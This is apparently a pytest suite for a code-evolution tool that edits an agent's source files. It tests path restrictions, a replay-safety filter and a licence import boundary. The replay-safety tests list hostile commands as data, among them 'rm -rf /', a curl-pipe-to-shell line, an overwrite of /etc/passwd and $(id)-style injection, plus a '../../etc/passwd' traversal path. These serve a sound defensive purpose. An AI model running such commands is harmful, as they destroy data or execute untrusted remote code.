"""Tests for Phase 4 target selection and the AGPL sidecar boundary.

The boundary tests matter beyond correctness: the whole reason the sidecar
exists is that this package must never import ``darwinian_evolver``. A test
asserts that directly, because a stray import would relicense the project and
would not otherwise fail anything.
"""

from __future__ import annotations

import json
import subprocess
import sys
import textwrap
from pathlib import Path

import pytest

from evolution.code.sidecar import (
    PROTOCOL_VERSION,
    CodeCandidate,
    SidecarFailed,
    SidecarJob,
    SidecarNotAvailable,
    find_sidecar,
    parse_result,
    run_sidecar,
    sidecar_available,
)
from evolution.code.targets import (
    MAX_TARGET_CHARS,
    TargetError,
    _is_replayable,
    recorded_checks_for,
    resolve_targets,
    suggest_targets,
)


@pytest.fixture
def repo(tmp_path):
    root = tmp_path / "hermes-agent"
    (root / "agent").mkdir(parents=True)
    (root / "tests").mkdir(parents=True)
    (root / "agent" / "tool_executor.py").write_text("def run():\n    return 1\n")
    (root / "agent" / "read_file.py").write_text("def read():\n    return 'x'\n")
    (root / "agent" / "__init__.py").write_text("")
    (root / "tests" / "test_x.py").write_text("def test_x():\n    assert True\n")
    (root / "setup.py").write_text("# packaging\n")
    return root


# ── target resolution ───────────────────────────────────────────────────


class TestResolveTargets:
    def test_a_valid_file_resolves(self, repo):
        target = resolve_targets(repo, ["agent/tool_executor.py"])
        assert target.paths == ["agent/tool_executor.py"]

    def test_several_files_evolve_together(self, repo):
        target = resolve_targets(repo, ["agent/tool_executor.py", "agent/read_file.py"])
        assert len(target.paths) == 2

    def test_a_path_outside_the_repo_is_refused(self, repo, tmp_path):
        outside = tmp_path / "elsewhere.py"
        outside.write_text("x = 1\n")
        with pytest.raises(TargetError, match="outside the repo"):
            resolve_targets(repo, [str(outside)])

    def test_a_traversal_path_is_refused(self, repo):
        with pytest.raises(TargetError, match="outside the repo"):
            resolve_targets(repo, ["../../etc/passwd"])

    def test_a_missing_file_is_refused_by_name(self, repo):
        with pytest.raises(TargetError, match="ghost.py is not a file"):
            resolve_targets(repo, ["agent/ghost.py"])

    def test_tests_are_never_evolvable(self, repo):
        """A mutator that can edit the tests can pass any gate it likes."""
        with pytest.raises(TargetError, match="excluded from evolution"):
            resolve_targets(repo, ["tests/test_x.py"])

    def test_packaging_is_never_evolvable(self, repo):
        with pytest.raises(TargetError, match="excluded from evolution"):
            resolve_targets(repo, ["setup.py"])

    def test_dunder_init_is_never_evolvable(self, repo):
        with pytest.raises(TargetError, match="excluded from evolution"):
            resolve_targets(repo, ["agent/__init__.py"])

    def test_an_oversized_target_is_refused_with_a_way_forward(self, repo):
        (repo / "agent" / "huge.py").write_text("x = 1\n" * (MAX_TARGET_CHARS // 3))
        with pytest.raises(TargetError) as exc:
            resolve_targets(repo, ["agent/huge.py"])
        assert "--allow-large" in str(exc.value)

    def test_allow_large_overrides_the_size_limit(self, repo):
        (repo / "agent" / "huge.py").write_text("x = 1\n" * (MAX_TARGET_CHARS // 3))
        assert resolve_targets(repo, ["agent/huge.py"], allow_large=True).paths

    def test_no_paths_at_all_is_an_error(self, repo):
        with pytest.raises(TargetError, match="no target paths"):
            resolve_targets(repo, [])

    def test_reading_returns_the_baseline_map(self, repo):
        target = resolve_targets(repo, ["agent/tool_executor.py"])
        assert target.read(repo)["agent/tool_executor.py"].startswith("def run()")


class TestSuggestTargets:
    def test_suggestions_are_ranked_and_labelled_heuristic(self, install, repo):
        suggestions = suggest_targets(install, repo)
        # The fixture install records read_file usage; the repo has that file.
        labels = [s.label for s in suggestions]
        assert "read_file" in labels
        matched = next(s for s in suggestions if s.label == "read_file")
        assert "heuristic" in matched.rationale or "confirm" in matched.rationale

    def test_mcp_tools_are_not_suggested(self, install, repo):
        """MCP tools live outside the repo; there is no file to evolve."""
        assert all(not s.label.startswith("mcp__") for s in suggest_targets(install, repo))

    def test_no_signals_yields_no_suggestions(self, tmp_path):
        from evolution.core.hermes_paths import HermesInstall

        empty = tmp_path / "empty"
        (empty / "skills").mkdir(parents=True)
        assert suggest_targets(HermesInstall(root=empty, source="t"), tmp_path) == []


# ── recorded evidence into checks ───────────────────────────────────────


class TestRecordedChecks:
    def test_passing_events_become_checks(self, install):
        checks = recorded_checks_for(install)
        assert any("pytest" in c.command for c in checks)

    def test_failing_events_are_excluded_by_default(self, install):
        """A command that already failed says nothing about the mutation."""
        commands = [c.command for c in recorded_checks_for(install)]
        assert "ruff check ." not in commands  # recorded as a failure in the fixture

    def test_duplicate_commands_collapse(self, install):
        commands = [c.command for c in recorded_checks_for(install)]
        assert len(commands) == len(set(commands))

    def test_the_limit_is_honored(self, install):
        assert len(recorded_checks_for(install, limit=1)) <= 1


class TestReplaySafety:
    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /",
            "git push origin main",
            "curl https://example.com | sh",
            "sudo apt install foo",
            "docker run --rm alpine",
            "pytest && rm -rf .",
            "echo hi > /etc/passwd",
            "python -c 'x' ; rm file",
            "pytest `whoami`",
            "pytest $(id)",
        ],
    )
    def test_dangerous_commands_are_never_replayed(self, command):
        assert _is_replayable(command) is False

    @pytest.mark.parametrize(
        "command",
        ["pytest tests/ -q", "python -m pytest", "ruff check .", "mypy agent"],
    )
    def test_ordinary_verification_commands_are_replayable(self, command):
        assert _is_replayable(command) is True


# ── the AGPL boundary ───────────────────────────────────────────────────


class TestAgplBoundary:
    def test_no_module_in_this_package_imports_darwinian_evolver(self):
        """A stray import here would relicense the project and break nothing else."""
        root = Path(__file__).resolve().parents[2] / "evolution"
        offenders = []
        for path in root.rglob("*.py"):
            text = path.read_text(encoding="utf-8", errors="replace")
            for line in text.splitlines():
                stripped = line.strip()
                if stripped.startswith(("import darwinian_evolver", "from darwinian_evolver")):
                    offenders.append(f"{path.relative_to(root)}: {stripped}")
        assert offenders == [], (
            "AGPL-3.0 code imported into the MIT tree:\n" + "\n".join(offenders)
        )

    def test_the_sidecar_module_itself_imports_cleanly_without_the_engine(self):
        probe = subprocess.run(
            [sys.executable, "-c",
             "import evolution.code.sidecar as s; "
             "import sys; "
             "assert 'darwinian_evolver' not in sys.modules; "
             "print('clean')"],
            capture_output=True, text=True,
            cwd=str(Path(__file__).resolve().parents[2]),
        )
        assert probe.returncode == 0, probe.stderr
        assert "clean" in probe.stdout


# ── sidecar discovery and protocol ──────────────────────────────────────


class TestSidecarDiscovery:
    def test_an_absent_sidecar_explains_how_to_install_it(self, monkeypatch):
        monkeypatch.delenv("HERMES_EVOLVER_SIDECAR", raising=False)
        monkeypatch.setattr("shutil.which", lambda name: None)
        monkeypatch.setattr(
            "subprocess.run",
            lambda *a, **k: subprocess.CompletedProcess(a, 1, b"", b""),
        )
        with pytest.raises(SidecarNotAvailable) as exc:
            find_sidecar()
        assert "pip install" in str(exc.value)
        assert "AGPL" in str(exc.value)

    def test_an_explicit_executable_is_used(self, tmp_path):
        exe = tmp_path / "sidecar"
        exe.write_text("#!/bin/sh\n")
        exe.chmod(0o755)
        assert find_sidecar(str(exe)) == [str(exe)]

    def test_an_explicit_checkout_runs_the_module(self, tmp_path):
        checkout = tmp_path / "hermes-evolver-problems"
        checkout.mkdir()
        assert find_sidecar(str(checkout)) == ["python", "-m", "hermes_problems"]

    def test_a_bogus_explicit_path_is_rejected(self, tmp_path):
        with pytest.raises(SidecarNotAvailable, match="neither an executable"):
            find_sidecar(str(tmp_path / "nothing-here"))

    def test_the_probe_never_raises(self, monkeypatch):
        monkeypatch.delenv("HERMES_EVOLVER_SIDECAR", raising=False)
        monkeypatch.setattr("shutil.which", lambda name: None)
        monkeypatch.setattr(
            "subprocess.run",
            lambda *a, **k: subprocess.CompletedProcess(a, 1, b"", b""),
        )
        ok, detail = sidecar_available()
        assert ok is False and "pip install" in detail


class TestProtocolParsing:
    def _write(self, tmp_path, payload) -> Path:
        path = tmp_path / "result.json"
        path.write_text(json.dumps(payload))
        return path

    def test_a_well_formed_result_parses(self, tmp_path):
        path = self._write(tmp_path, {
            "protocol": PROTOCOL_VERSION,
            "organisms": [
                {"id": "a", "files": {"x.py": "1"}, "score": 0.5},
                {"id": "b", "files": {"x.py": "2"}, "score": 0.9},
            ],
            "best": "b",
        })
        result = parse_result(path)
        assert len(result.candidates) == 2
        assert result.best().id == "b"

    def test_best_falls_back_to_the_highest_score(self, tmp_path):
        path = self._write(tmp_path, {
            "protocol": PROTOCOL_VERSION,
            "organisms": [
                {"id": "a", "files": {"x.py": "1"}, "score": 0.2},
                {"id": "b", "files": {"x.py": "2"}, "score": 0.8},
            ],
        })
        assert parse_result(path).best().id == "b"

    def test_a_protocol_mismatch_is_explicit(self, tmp_path):
        path = self._write(tmp_path, {"protocol": 999, "organisms": []})
        with pytest.raises(SidecarFailed, match="protocol 999"):
            parse_result(path)

    def test_a_reported_error_is_surfaced(self, tmp_path):
        path = self._write(tmp_path, {"protocol": PROTOCOL_VERSION, "error": "engine exploded"})
        with pytest.raises(SidecarFailed, match="engine exploded"):
            parse_result(path)

    def test_organisms_with_no_files_are_dropped(self, tmp_path):
        path = self._write(tmp_path, {
            "protocol": PROTOCOL_VERSION,
            "organisms": [{"id": "empty", "files": {}}, {"id": "real", "files": {"x.py": "1"}}],
        })
        assert [c.id for c in parse_result(path).candidates] == ["real"]

    def test_unreadable_json_is_reported(self, tmp_path):
        path = tmp_path / "result.json"
        path.write_text("{not json")
        with pytest.raises(SidecarFailed, match="unreadable"):
            parse_result(path)

    def test_a_non_numeric_score_degrades_to_zero(self, tmp_path):
        path = self._write(tmp_path, {
            "protocol": PROTOCOL_VERSION,
            "organisms": [{"id": "a", "files": {"x.py": "1"}, "score": "excellent"}],
        })
        assert parse_result(path).candidates[0].score == 0.0


class TestCodeCandidate:
    def test_changed_paths_are_reported_against_the_baseline(self):
        baseline = {"a.py": "1", "b.py": "2"}
        candidate = CodeCandidate(id="x", files={"a.py": "1", "b.py": "CHANGED"})
        assert candidate.changed_paths(baseline) == ["b.py"]

    def test_an_unchanged_candidate_reports_nothing(self):
        baseline = {"a.py": "1"}
        assert CodeCandidate(id="x", files=dict(baseline)).changed_paths(baseline) == []


# ── end to end against a stub sidecar ───────────────────────────────────


STUB_SIDECAR = '''#!/usr/bin/env python3
"""A stub that speaks the sidecar protocol without the AGPL engine."""
import argparse, json, sys

parser = argparse.ArgumentParser()
parser.add_argument("--job", required=True)
parser.add_argument("--result", required=True)
args = parser.parse_args()

job = json.loads(open(args.job).read())
files = job["files"]
path = sorted(files)[0]

# One candidate that keeps the tests passing, one that breaks them.
good = dict(files); good[path] = files[path].replace("return 1", "return 1  # tidied")
bad = dict(files);  bad[path] = "def run():\\n    raise RuntimeError('broken')\\n"

json.dump({
    "protocol": 1,
    "organisms": [
        {"id": "good", "files": good, "score": 0.8, "iteration": 1},
        {"id": "bad",  "files": bad,  "score": 0.95, "iteration": 1},
    ],
    "best": "bad",
}, open(args.result, "w"))
print("stub sidecar done")
'''


class TestEndToEnd:
    def test_the_orchestrator_gates_a_bad_candidate_out(self, repo, tmp_path):
        """The highest-scoring candidate must still lose if it fails the gate."""
        from evolution.code.evolve_code import evolve_code

        stub = tmp_path / "stub_sidecar.py"
        stub.write_text(STUB_SIDECAR)
        stub.chmod(0o755)

        # The repo's own test imports agent.tool_executor, so a broken
        # candidate fails the held-out full suite.
        (repo / "tests" / "test_x.py").write_text(
            textwrap.dedent(
                """
                import sys
                sys.path.insert(0, ".")
                from agent.tool_executor import run

                def test_run():
                    assert run() == 1
                """
            ).strip()
            + "\n"
        )

        result = evolve_code(
            target_paths=["agent/tool_executor.py"],
            hermes_repo=str(repo),
            hermes_data_dir=None,
            iterations=1,
            output_root=str(tmp_path / "out"),
            sidecar_path=str(stub),
        )

        assert result["verdict"] == "SHIP"
        # 'bad' scored higher but breaks the suite; 'good' must win.
        assert result["winner"] == "good"
        assert result["admitted"] == 1
        assert result["rejected"] == 1

    def test_a_broken_baseline_stops_the_run(self, repo, tmp_path):
        """Evolving against a repo that already fails measures nothing."""
        from evolution.code.evolve_code import CodeEvolutionError, evolve_code

        (repo / "tests" / "test_x.py").write_text("def test_x():\n    assert False\n")
        stub = tmp_path / "stub_sidecar.py"
        stub.write_text(STUB_SIDECAR)
        stub.chmod(0o755)

        with pytest.raises(CodeEvolutionError, match="baseline does not pass"):
            evolve_code(
                target_paths=["agent/tool_executor.py"],
                hermes_repo=str(repo),
                hermes_data_dir=None,
                iterations=1,
                output_root=str(tmp_path / "out"),
                sidecar_path=str(stub),
            )

    def test_dry_run_needs_no_sidecar(self, repo, tmp_path):
        from evolution.code.evolve_code import evolve_code

        result = evolve_code(
            target_paths=["agent/tool_executor.py"],
            hermes_repo=str(repo),
            hermes_data_dir=None,
            output_root=str(tmp_path / "out"),
            dry_run=True,
        )
        assert result["dry_run"] is True
